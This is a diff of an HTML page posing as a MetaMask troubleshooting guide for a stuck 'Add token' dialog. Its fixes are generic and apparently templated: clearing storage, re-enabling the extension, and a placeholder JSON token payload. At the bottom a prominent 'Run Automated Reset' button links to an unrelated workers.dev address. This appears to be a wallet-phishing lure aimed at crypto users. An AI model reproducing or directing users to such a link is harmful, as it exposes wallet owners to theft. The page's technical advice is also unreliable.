@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -39,39 +39,41 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp</h1>
+<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a persistent "Add token" page when attempting to confirm the addition of a token from a decentralized application (dapp) using the Metamask extension on the Ethereum (ETH) ecosystem. The dialog box fails to progress, leaving the user stuck on the "Add token" page.</li>
+<li>The user attempts to add a token from a decentralized application (dapp) using Metamask, but the "Add token" dialog box persists, preventing the user from confirming the addition of the token.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue is rooted in a bug within the Metamask extension, specifically related to handling token additions from dapps. This bug prevents the extension from properly confirming and finalizing the token addition process.</li>
+<li>The error occurs due to a bug in the Metamask extension, where the dialog box fails to close after the user clicks "Add token", resulting in an infinite loop.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To bypass this issue, users can attempt the following manual overrides:</li>
-<li>Manually add the token contract address and details in the Metamask extension.</li>
-<li>Clear the Metamask extension's cache and storage.</li>
-<li>Utilize a custom JSON payload to force-add the token, as shown below:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Clear the browser's local storage and cookies</li>
+<li>Disable and re-enable the Metamask extension</li>
+<li>Use the Metamask API to manually add the token using the following JSON payload:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ERC20&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token_contract_address...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token_symbol...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;decimal&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token_image_url...&quot;</span>
+<span class="w">  </span><span class="nt">&quot;options&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token address...&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TOKEN&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://...token image...&quot;</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting and customization.</p>
+<p>For a more comprehensive solution, consider utilizing a command-line interface. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured.</li>
-<li>Ethereum wallet set up and connected to the dapp.</li>
-<li>The dapp is properly configured to interact with the Metamask extension.</li>
+<li>Metamask extension installed</li>
+<li>Basic understanding of JSON data format</li>
+<li>Familiarity with browser local storage and cookies management</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reconnect</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
